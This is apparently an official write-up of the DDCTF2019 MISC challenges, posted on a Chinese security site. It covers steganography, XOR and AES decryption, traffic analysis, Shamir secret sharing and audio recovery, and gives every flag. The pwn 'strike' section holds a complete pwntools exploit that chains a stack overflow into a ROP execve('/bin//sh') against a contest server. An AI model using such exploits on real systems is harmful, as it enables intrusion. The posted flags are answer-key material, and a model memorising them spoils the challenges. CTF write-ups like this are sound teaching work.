> 原文链接: https://www.anquanke.com//post/id/178392 


# DDCTF2019官方Write Up——MISC篇


                                阅读量   
                                **292170**
                            
                        |
                        
                                                                                    



[![](https://p0.ssl.qhimg.com/t019114f3b0c1f3e02e.jpg)](https://p0.ssl.qhimg.com/t019114f3b0c1f3e02e.jpg)



作者：**** 哈尔滨工业大学 /研一/DDCTF2019 Misc方向 Top1

第三届DDCTF高校闯关赛鸣锣开战，DDCTF是滴滴针对国内高校学生举办的网络安全技术竞技赛，由滴滴出行安全产品与技术部顶级安全专家出题，已成功举办两届。在过去两年，共有一万余名高校同学参加了挑战，其中部分优胜选手选择加入滴滴，参与到了解决出行领域安全问题的挑战中。通过这样的比赛，我们希望挖掘并培养更多的国际化创新型网络安全人才，共同守护亿万用户的出行安全。



## 0x01：真-签到题

公告中给出flag:DDCTF`{`return DDCTF::get(2019)-&gt;flagOf(0);`}`



## 0x02：北京地铁

给了一个bmp。图片分析,根据题目描述，应该是AES-ECB加密，目前通过低位隐写拿到了base64(ciphertext),密钥16bytes未知.hint:Color Threshold 则通过gimp2查看Color Threshold，仍然没有线索，等到hint：关注图片本身的时候，无意间看了图片，发现魏公村颜色不对，根据提示，可能是密钥。

```
pwn@7feilee:/mnt/c/Users/7feilee/Downloads$ zsteg color.bmp --all --limit 2048
/usr/lib/ruby/2.5.0/open3.rb:199: warning: Insecure world writable dir /home/pwn/.cargo/bin in PATH, mode 040777
imagedata           .. text: ")))XXX)))"
b1,rgb,lsb,xy       .. text: "iKk/Ju3vu4wOnssdIaUSrg=="
```

尝试解密；:

```
cipher = base64.b64decode("iKk/Ju3vu4wOnssdIaUSrg==")
key = "weigongcun"
key =key+(16-len(key))*"\x00"
print key
from Crypto.Cipher import  AES
aes =  AES.new(key, AES.MODE_ECB)
print aes.decrypt(cipher)
# weigongcun
# DDCTF`{`CD*Q23&amp;0`}`

flag:DDCTF`{`CD*Q23&amp;0`}`
```



## 0x03：MulTzor

题目提供的是hex,根据题目分析，可知是词频分析，本打算统计词频分析来做，想到了xortools,猜测词频中最常见的字符为0x20，即空格符。

```
txt = "38708d2a29ff535d9e3f20f85b40df3c3fab465b9a731ce55b54923279e85b4397362be25c54df2020f8465692733ce5535193363dab465b9a732eee41479a2137ab735f933a3cf8125a91730ee4405f9b730eea4013b61a79ff5d138d3638ef12408a312aff535d8b3a38e71252923c2ce54640df3c3fab7f5c8d203ca6515c9b363dab40529b3a36ab515c923e2ce55b509e2730e45c40df3c3fab465b9a7318f35b40df2336fc57418c732de35347df3b38ef12519a3637ab575d9c3a29e357419a3779fe415a913479ce5c5a983e38ab5f529c3b30e55740d1730de35b40df2a30ee5e579a3779e65b5f962738f94b13963d2dee5e5f96343ce55156df2431e2515bd37338e75d5d98732ee2465bdf2731ea4613992136e6125c8b3b3cf912579a302bf242479a3779ca4a5a8c732bea565a907338e556138b3635ee4241963d2dee40138b2138e5415e96202ae25d5d8c7f79fc5340df3430fd575ddf2731ee125090373ce5535e9a730ce746419e7d79df5a5a8c732eea41139c3c37f85b579a213cef125186732eee41479a2137ab61468f213ce65713be3f35e25757df1036e65f5291373cf91277883a3ee34613bb7d79ce5b409a3d31e445568d732de4125b9e253cab50569a3d79a956569c3a2ae24456dd732de41247973679ca5e5f96363dab445a9c2736f94b1df5590de35713ba3d30ec5f52df3e38e85a5a91362aab45568d3679ea12559e3e30e74b13903579fb5d418b323be757139c3a29e35741df3e38e85a5a91362aab455a8b3b79f95d47902179f851419e3e3be757418c7d79cc5d5c9b7336fb57419e2730e555138f2136e857578a213cf81e138f2136fb5741932a79ee5c5590213aee561fdf2436fe5e57df3b38fd571392323dee1247973679fb5e46983136ea4057df1637e2555e9e7334ea515b963d3cab475d9d213cea59529d3f3ca5127b90243cfd5741d37334e44147df3c3fab465b9a731eee405e9e3d79e65b5f962738f94b13993c2be85740d3732aee51419a2779f85741893a3aee41139e3d3dab515a893a35e2535ddf323eee5c5096362aab465b9e2779fe41569b731ce55b54923279ee5f43933c20ee56138f3c36f9125c8f362bea465a913479fb405c9c363dfe40568c7f79ea5c57df3a2dab45528c732de357409a7329e45d41df232be451569b262bee41138b3b38ff1252933f36fc5757df2731ee1276913a3ee6531392323ae35b5d9a2079ff5d139d3679f957459a212aee1f56913430e557568d363dab535d9b732de357139c3a29e357418c732de412519a732bee5357d15953df5a56df143cf95f52917329e747549d3c38f9561e9a222ce242439a3779ce5c5a983e38ab50569c3234ee127d9e2930ab75568d3e38e54b148c7329f95b5d9c3a29ea5e139c2120fb465cd22020f84656927d79c2461388322aab504190383ce5125186732de35713af3c35e2415bdf143ce557419e3f79d8465299357ef81270962331ee4013bd262bee5346df3a37ab76569c3634e95741df6260b8001fdf2430ff5a138b3b3cab535a9b7336ed12758d3637e85a1e8c2629fb5e5a9a3779e25c479a3f35e2555691303cab5f528b362be2535fdf3c3bff535a91363dab5441903e79ea12749a2134ea5c138c2320a51272df3e36e5465bdf313ced5d419a732de3571390262de940569e3879e45413a83c2be75613a8322bab7b7ad37338ff1252df3036e554568d3637e85713973635ef125d9a322bab65528d2038fc1e138b3b3cab625c933a2ae31270962331ee4013bd262bee5346df2031ea40569b7330ff4113ba3d30ec5f52d2312bee5358963d3eab46569c3b37e243469a2079ea5c57df273ce85a5d903f36ec4b13883a2de31247973679cd4056913031ab535d9b731bf95b47962031a512778a2130e555138b3b3cab75568d3e38e5125a912538f85b5c917336ed1263903f38e5561fdf3036f95713af3c35e2415bdf1030fb5a568d731bfe40569e2679fb57418c3c37e5575fdf243cf957139a2538e847528b363da71245963279d95d5e9e3d30ea1e138b3c79cd405291303cab455b9a213cab465b9a2a79ee41479e3135e2415b9a3779ff5a56df031aab70418a3d36ab415a983d38e74113963d2dee5e5f96343ce55156df202dea465a903d79fc5b4797731ff9575d9c3b79ed5350963f30ff5b568c732afe424390212da512608a303aee4140992635ab515c90233cf95347963c37ab535e903d3eab465b9a7309e45e568c7f79ff5a56df152bee5c50977f79ea5c57df2731ee12718d3a2de2415bdf322dab705f9a273ae35e56867309ea4058df3036e5465a91263cef1246912730e712798a3d3cab030acb6375ab455b9a3d79cd405291303cab41468d213ce556568d363dab465cdf2731ee12749a2134ea5c40d15953cd405c92732de35b40df313cec5b5d913a37ec1e138b3b3cab7041962730f85a13b83c2fee405d923637ff127090373cab535d9b731af2425b9a2179d8515b903c35ab1a74bc751ad81b139e2779c95e568b3031e7574adf0338f959139d2630e746138a2379ea5c139a2b2dee5c4096253cab514186232dea5c52932a2de251139c3229ea505a933a2df21c13b63d30ff5b52933f20a71247973679ef57508d2a29ff5b5c91732eea4113923230e55e4adf3c3fab7e4699272eea54559a7371cc5741923237ab535a8d733fe440509a7a79ea5c57df3279ed5744df1b3cee4013d7143cf95f52917338f95f4ad67334ee41409e343cf81e139e2079ff5a56df182be257548c3e38f95b5d9a7371cc5741923237ab5c52892a70ab575e8f3f36f25757df3e2ce85a13923c2bee12409a302cf957138f2136e857578a213cf81255902179fe415a913479ce5c5a983e38a51272933237ab66468d3a37ec1e139e731aea5f518d3a3dec5713aa3d30fd57418c3a2df2125e9e2731ee5f528b3a3ae2535ddf3237ef125f903430e85b52917f79fb405c893a3dee561392263ae3125c99732de35713902130ec5b5d9e3f79ff5a5a913830e555138b3b38ff125f9a3779ff5d138b3b3cab56568c3a3ee5125c99732de357139c2120fb4652913235f2465a9c3235ab505c92313cab5f529c3b30e55740df2731ea461388362bee125a91202df9475e9a3d2dea5e13963d79ee445691272cea5e5f86733bf95752943a37ec1247973679e553459e3f79ce5c5a983e38a5127b90243cfd5741d3732de35713b42130ee554092322be25c56df3a37ff405c9b263aee56139e3d79ce5c5a983e38ab44568d2030e45c13883a2de31252df3536fe404797732be4465c8d733fe4401396272aab671e9d3c38ff411fdf213cf8475f8b3a37ec125a917338ab4241903f36e555569b7329ee405a903779fc5a5691732de357409a7334ee41409e343cf81250902635ef125d902779e957139b363af94b438b363da51264962731ab465b9a733aea42478a213cab5d55df213ce757459e3d2dab515a8f3b3cf912589a2a2aab535d9b732de357138a203cab5d55df3e2ce85a1399322aff5741df060aab7c52892a79e95d5e9d362aa712419a342ce75341d3732bea425a9b732bee5357963d3eab5d55df0674e95d528b7334ee41409e343cf812419a202ce65757d15953df5a56df3535ea5513962063ab7677bc071ff002579c3638b806069d326dbd040bcf3169e90101cc3761ea0a02cf656db8570a82"
txt = txt.decode("hex")
print len(txt)
print len(set(txt))
open("xorout","wb").write(txt[1:])#xortools分析过一次，发现第一位是噪音干扰值，直接去除。

pwn@7feilee:/mnt/c/Users/7feilee$ xortool xorout -c 20
The most probable key lengths:
   3:   11.9%
   6:   19.7%
   9:   9.4%
  12:   14.5%
  15:   7.1%
  18:   11.2%
  21:   5.3%
  24:   8.4%
  30:   6.8%
  36:   5.7%
Key-length can be 3*n
1 possible key(s) of length 6:
3\xffSY\x8bw
Found 1 plaintexts with 95.0%+ printable characters
See files filename-key.csv, filename-char_used-perc_printable.csv
pwn@7feilee:/mnt/c/Users/7feilee$ xxd xortool_out/0.out
00000000: 4372 7970 7424 6e61 6c79 732c 7320 6f66  Crypt$nalys,s of
00000010: 2031 6865 2045 6e2c 676d 6120 632c 7068   1he En,gma c,ph
```

发现明文中有1/6的字母是错误的，应该是key的一位有问题，找到原文https://en.wikipedia.org/wiki/Cryptanalysis_of_the_Enigma 得到key:3\xffSY\x8b2 解密：

```
print repr(txt[:16])
data = open("xortool_out/0.out","rb").read()
print data
xxx = '''Cryptanalysis of the Enigma ciphering system enabled the western Allies in World War II to read substantial amounts of Morse-coded radio communications of the Axis powers that had been enciphered using Enigma machines. This yielded military intelligence which, along with that from other decrypted Axis radio and teleprinter transmissions, was given the codename Ultra. This was considered by western Supreme Allied Commander Dwight D. Eisenhower to have been "decisive" to the Allied victory.'''
out = ""
for i in range(0,493):
    out +=chr(ord(txt[i+1])^ord(xxx[i]))
print repr(out)
length = 2654
key = "3\xffSY\x8b2"
plain =""
for i in range(0,2654):
    plain +=chr(ord(txt[i+1])^ord(key[i%6]))
print plain

flag：DDCTF`{`0dcea345ba46680b0b323d8a810643e9`}`
```



## 0x04：[PWN] strike

pwn题 静态分析： read(v2, &amp;buf, 0x40u);return fprintf(a2, “Hello %s”, &amp;buf); 这里可以泄露栈上的数据。

```
v5 = &amp;a1;
  setbuf(stdout, 0);
  sub_80485DB(stdin, stdout);
  sleep(1u);
  printf("Please set the length of password: ");
  nbytes = sub_804862D();
  if ( (signed int)nbytes &gt; 63 )
  `{`
    puts("Too long!");
    exit(1);
  `}`
  printf("Enter password(lenth %u): ", nbytes);
  v1 = fileno(stdin);
  read(v1, &amp;buf, nbytes);
  puts("All done, bye!");
  return 0;
```

nbytes是无符号数，(signed int)nbytes可以整数溢出，从而buffer overflow,栈不可执行，可以rop on libc.动态调试发现第一个泄露中有ebp地址，还有setbuf的地址。程序结尾代码段如下。

```
mov     eax, 0
lea     esp, [ebp-8]
pop     ecx
pop     ebx
pop     ebp
lea     esp, [ecx-4]
retn
```

通过调试，从而可以控制ecx,从而恢复esp。（通过之前泄露的ebp地址，调试发现最终的返回地址为ebp+8,所以之前的栈上数据覆盖为ebp+8+4,最终pop ecx,lea esp, [ecx-4],控制esp为原来的esp。从而可以pop esp,跳转到libc中，从而rop。脚本如下。:

```
#-*- coding:utf-8
from pwn import *
from struct import pack
## remote libc
def rop(addr):
    p = ''
    p += pack('&lt;I', addr+0x00001aa6) # pop edx ; ret
    p += pack('&lt;I', addr+0x001b0040) # @ .data
    p += pack('&lt;I', addr+0x00023f97) # pop eax ; ret
    p += '/bin'
    p += pack('&lt;I', addr+0x0006b34b) # mov dword ptr [edx], eax ; ret
    p += pack('&lt;I', addr+0x00001aa6) # pop edx ; ret
    p += pack('&lt;I', addr+0x001b0044) # @ .data + 4
    p += pack('&lt;I', addr+0x00023f97) # pop eax ; ret
    p += '//sh'
    p += pack('&lt;I', addr+0x0006b34b) # mov dword ptr [edx], eax ; ret
    p += pack('&lt;I', addr+0x00001aa6) # pop edx ; ret
    p += pack('&lt;I', addr+0x001b0048) # @ .data + 8
    p += pack('&lt;I', addr+0x0002c5fc) # xor eax, eax ; ret
    p += pack('&lt;I', addr+0x0006b34b) # mov dword ptr [edx], eax ; ret
    p += pack('&lt;I', addr+0x00018395) # pop ebx ; ret
    p += pack('&lt;I', addr+0x001b0040) # @ .data
    p += pack('&lt;I', addr+0x000b4047) # pop ecx ; ret
    p += pack('&lt;I', addr+0x001b0048) # @ .data + 8
    p += pack('&lt;I', addr+0x00001aa6) # pop edx ; ret
    p += pack('&lt;I', addr+0x001b0048) # @ .data + 8
    p += pack('&lt;I', addr+0x0002c5fc) # xor eax, eax ; ret
    p += pack('&lt;I', addr+0x00007eec) # inc eax ; ret
    p += pack('&lt;I', addr+0x00007eec) # inc eax ; ret
    p += pack('&lt;I', addr+0x00007eec) # inc eax ; ret
    p += pack('&lt;I', addr+0x00007eec) # inc eax ; ret
    p += pack('&lt;I', addr+0x00007eec) # inc eax ; ret
    p += pack('&lt;I', addr+0x00007eec) # inc eax ; ret
    p += pack('&lt;I', addr+0x00007eec) # inc eax ; ret
    p += pack('&lt;I', addr+0x00007eec) # inc eax ; ret
    p += pack('&lt;I', addr+0x00007eec) # inc eax ; ret
    p += pack('&lt;I', addr+0x00007eec) # inc eax ; ret
    p += pack('&lt;I', addr+0x00007eec) # inc eax ; ret
    p += pack('&lt;I', addr+0x00002c87) # int 0x80
    return p
context.log_level = "debug"
libc = ELF('./libc.so.6')
setbuf = libc.symbols['setbuf']
p = remote("116.85.48.105", 5005)
p.recvuntil("Enter username: ")
p.send("a"*60)
p.recv(66)
offset = u32(p.recv(4))-setbuf
p.recv(8)
ebp = u32(p.recv(4))
print hex(ebp)
print hex(offset)
p.recvuntil("Please set the length of password: ")
p.sendline("-1")
p.recv()
# payload = "a"*0x4c+rop(offset)
payload  = p32(ebp+8+4)*((0x4c+8)/4) + rop(offset)
print repr(payload)
# gdb.attach(p)
p.sendline(payload)
p.interactive()

flag:DDCTF`{`s0_3asy_St4ck0verfl0w_r1ght?`}`
```



## 0x05：Wireshark

wireshark数据包分析,通过分析TCP流,follow -&gt; TCP steam，其中有图片(PNG头)，搜索http contains flag,http contains DDCTF没有信息。http contains PNG发现三张图片，查看发现了一个interesting.png和upload.png,通过File -&gt; export Object HTTP 和 010editor，可以拿到三张图片还有一些静态网站。

[![](https://p1.ssl.qhimg.com/t01c05bff67faeb9207.png)](https://p1.ssl.qhimg.com/t01c05bff67faeb9207.png)

隐写分析，发现两张图片一样，猜测一张是图种，interesting.png是隐写后的图片，stegsolve分析，调整图片高度，和水印都没有结果，猜测跟upload.png有关系，是个key图样的图片，隐写分析通过调整图片高度，拿到key：gKvN4eEm。通过导出的静态网站中发现很多跟图片相关的网站，猜测可能是在线图片加解密，通过导出HTTP Object的信息，http://tools.jb51.net/aideddesign/img_add_info可以加解密图片，测试在线解密interesting.png。key为gKvN4eEm flag:flag+AHs-44444354467B786F6644646B65537537717335414443515256476D35464536617868455334377D+AH0-:

```
print "44444354467B786F6644646B65537537717335414443515256476D35464536617868455334377D".decode("hex")
#DDCTF`{`xofDdkeSu7qs5ADCQRVGm5FE6axhES47`}`

flag:DDCTF`{`xofDdkeSu7qs5ADCQRVGm5FE6axhES47`}`
```



## 0x06：联盟决策大会

考点：secret sharing, shamir 题目描述：至少A,B同时大于等于三个成员一起才能打开密钥，则分析一共有两次秘密分享，第一次分成了三份，A,B各一份，然后A,B分别分成了五份，然后分给A,B成员。则两次恢复即可。脚本参考http://mslc.ctf.su/wp/plaidctf-2012-nuclear-launch-detected-150-password-guessing/，代码如下：

```
import gmpy2
from Crypto.Util.number import long_to_bytes,bytes_to_long
p =0x85FE375B8CDB346428F81C838FCC2D1A1BCDC7A0A08151471B203CDDF015C6952919B1DE33F21FB80018F5EA968BA023741AAA50BE53056DE7303EF702216EE9
f11 =0x60E455AAEE0E836E518364442BFEAB8E5F4E77D16271A7A7B73E3A280C5E8FD142D3E5DAEF5D21B5E3CBAA6A5AB22191AD7C6A890D9393DBAD8230D0DC496964
f12 =0x6D8B52879E757D5CEB8CBDAD3A0903EEAC2BB89996E89792ADCF744CF2C42BD3B4C74876F32CF089E49CDBF327FA6B1E36336CBCADD5BE2B8437F135BE586BB1
f14 =0x74C0EEBCA338E89874B0D270C143523D0420D9091EDB96D1904087BA159464BF367B3C9F248C5CACC0DECC504F14807041997D86B0386468EC504A158BE39D7
f23 =0x560607563293A98D6D6CCB219AC74B99931D06F7DEBBFDC2AFCC360A12A97D9CA950475036497F44F41DC5492977F9B4A0E4C8E0368C7606B7B82C34F561525
f24 =0x445CCE871E61AD5FDE78ECE87C42219D5C9F372E5BEC90C4C4990D2F37755A4082C7B52214F897E4EC1B5FB4A296DBE5718A47253CC6E8EAF4584625D102CC62
f25 =0x4F148B40332ACCCDC689C2A742349AEBBF01011BA322D07AD0397CE0685700510A34BDC062B26A96778FA1D0D4AFAF9B0507CC7652B0001A2275747D518EDDF5
pairs = []
pairs += [(1, f11)]
pairs += [(2, f12)]
pairs += [(4, f14)]
pairs2 = []
pairs2 += [(3, f23)]
pairs2 += [(4, f24)]
pairs2 += [(5, f25)]
res1 = 0
for i, pair in enumerate(pairs):
    x, y = pair
    top = 1
    bottom = 1
    for j, pair in enumerate(pairs):
        if j == i:
            continue
        xj, yj = pair
        top = (top * (-xj)) % p
        bottom = (bottom * (x - xj)) % p
    res1 += (y * top * gmpy2.invert(bottom, p)) % p
    res1 %= p
print res1
res2 = 0
for i, pair in enumerate(pairs2):
    x, y = pair
    top = 1
    bottom = 1
    for j, pair in enumerate(pairs2):
        if j == i:
            continue
        xj, yj = pair
        top = (top * (-xj)) % p
        bottom = (bottom * (x - xj)) % p
    res2 += (y * top * gmpy2.invert(bottom, p)) % p
    res2 %= p
print res2
pairs3 = [(1,res1),(2,res2)]
res3 = 0
for i, pair in enumerate(pairs3):
    x, y = pair
    top = 1
    bottom = 1
    for j, pair in enumerate(pairs3):
        if j == i:
            continue
        xj, yj = pair
        top = (top * (-xj)) % p
        bottom = (bottom * (x - xj)) % p
    res3 += (y * top * gmpy2.invert(bottom, p)) % p
    res3 %= p
print res3
print repr(long_to_bytes(res3))
# 'DDCTF`{`nYrpbcscdNgqX63IdtnkLrq9FQvwfa2f`}`'

flag:DDCTF`{`nYrpbcscdNgqX63IdtnkLrq9FQvwfa2f`}`
```



## 0x07：伪-声纹锁

分析给的voice_lock文件，首先在限定的采样频率范围内进行傅里叶变换(首先采样频率范围小，在采样频率范围之内只有150个频率采样点，采样率低，导致还原的信号失真，混叠)。根据滑动窗口大小，进行傅里叶逆变换，得到较为失真的音频(虽然满足了calc_diff&lt;3,但是仍然听不出flag) 分析过程：

[![](https://p2.ssl.qhimg.com/t01348204150ad7ac20.png)](https://p2.ssl.qhimg.com/t01348204150ad7ac20.png)

[![](https://p5.ssl.qhimg.com/t01275114b767a0aa6a.png)](https://p5.ssl.qhimg.com/t01275114b767a0aa6a.png)

还原音频程序：

```
import cmath
import librosa  # v0.6.2, maybe ffmpeg is needed as backend
import numpy as np  # v1.15.4
from scipy.fftpack import fft, ifft
import sys
from PIL import Image  # Pillow v5.4.1
import matplotlib.pyplot as plt

window_size = 2048
step_size = 100
max_lim = 0.15
f_ubound = 2000
f_bins = 150
sr = 15000

def transform_x(x, f_ubound=f_ubound, f_bins=f_bins):
    freqs = np.logspace(np.log10(20), np.log10(f_ubound), f_bins)
    seqs = []
    for f in freqs:
        seq = []
        d = cmath.exp(-2j * cmath.pi * f / sr)
        coeff = 1
        for t in range(0, len(x)):
            seq.append(x[t] * coeff)
            coeff *= d
        seqs.append(seq)
    sums = []
    for seq in seqs:
        X = [sum(seq[:window_size])/window_size]
        for t in range(step_size, len(x), step_size):
            X.append(X[-1]-sum(seq[t-step_size:t])/window_size)
            if t+window_size-step_size &lt; len(x):
                X[-1] += sum(seq[t+window_size-step_size:t +
                                 window_size])/window_size
        sums.append(X)
    return np.array(sums)

def calc_diff(x, spec):
    x = transform_x(x)
    print(x.shape)
    diff = 0
    for i in range(0, x.shape[0]):
        xx = np.abs(x[i])
        xx = np.round(linear_map(xx, np.min(
            xx), np.max(xx), 0, 255)).astype(np.uint8)
        sp = np.abs(spec[i])
        sp = np.round(linear_map(sp, np.min(
            sp), np.max(sp), 0, 255)).astype(np.uint8)
        diff += np.linalg.norm(xx-sp)
    return diff/x.shape[0]/x.shape[1]

freqs = np.logspace(np.log10(20), np.log10(f_ubound), f_bins)

N = 95000

def linear_map(v, old_dbound, old_ubound, new_dbound, new_ubound):
    return (v-old_dbound)*1.0/(old_ubound-old_dbound)*(new_ubound-new_dbound) + new_dbound

def image_to_array(img):
    img_arr = linear_map(np.array(img.getdata(), np.uint8).reshape(
        img.size[1], img.size[0], 3), 0, 255, -max_lim, max_lim)
    return img_arr[:, :, 1] + img_arr[:, :, 2] * 1j

C_fingerprint = image_to_array(Image.open('fingerprint.png'))

dataRecovered = [0 for i in range(N)]
dataRecoveredWriteCount = [0 for i in range(N)]

for windowStart in range(0, 93000, step_size):
    print('loop(', windowStart, '/', 93000, ')')
    xLen = 100

    F = []
    for i in range(len(freqs)):
        F.append((C_fingerprint[i][int(windowStart/100)]) *
                 cmath.exp(2j * cmath.pi * freqs[i] / sr * (100*int(windowStart/100))))

    xRecovered = []
    for n in range(100):
        result = 0
        for ad in range(len(freqs)):
            f = freqs[ad]
            fw = F[ad]
            result += fw * cmath.exp(2j * cmath.pi * f / sr * n)
        xRecovered.append(result)
    xRecovered = np.array(xRecovered)

    for ad in range(xLen):
        xr = xRecovered[ad]
        adAllocate = windowStart + ad
        dataRecovered[adAllocate] = (
            dataRecovered[adAllocate] * dataRecoveredWriteCount[adAllocate] + xr) / (dataRecoveredWriteCount[adAllocate] + 1)
        dataRecoveredWriteCount[adAllocate] += 1
dataRecovered = np.real(dataRecovered)
out = []
librosa.output.write_wav("recovered.wav", dataRecovered, sr)

for i in range(0, 150):
    out.append([C_fingerprint[i][j] for j in range(0, 950)])
out = np.array(out)
print(calc_diff(dataRecovered, out))

print('done!')
```

得到音频文件，跟官方人员沟通提交脚本和还原的音频后，得到flag:DDCTF`{`VOICE_ENCODED_TEST`}`



想了解更多 题目出题人视角解析，请关注：滴滴安全应急响应中心（DSRC）公众号查看：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t014ac0a7b1bb69306d.png)
